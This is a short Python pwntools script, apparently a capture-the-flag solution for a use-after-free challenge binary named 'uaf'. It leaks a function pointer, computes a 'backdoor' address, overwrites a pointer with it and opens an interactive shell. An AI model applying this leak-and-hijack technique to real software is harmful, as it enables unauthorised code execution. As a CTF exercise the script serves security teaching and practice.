#!/usr/bin/python3
from pwn import *

# p = remote('edu-ctf.csie.org', 10177)
p = process('./uaf')

def sendmsg(data, size):
    p.sendlineafter(':', str(size))
    p.sendafter(':', data)

sendmsg(b'a' * 0x8, 0x10)
p.recvuntil(b'aaaaaaaa')
bye = u64(p.recv(6).ljust(0x8, b'\0'))
backdoor = bye + 0x3e

print('bye {}'.format(hex(bye)))
print('backdoor {}'.format(hex(backdoor)))

# garbage
sendmsg(b'a' * 0x8, 0x10)

payload = b'a' * 0x8 + p64(backdoor)
sendmsg(payload, 0x10)

p.interactive()
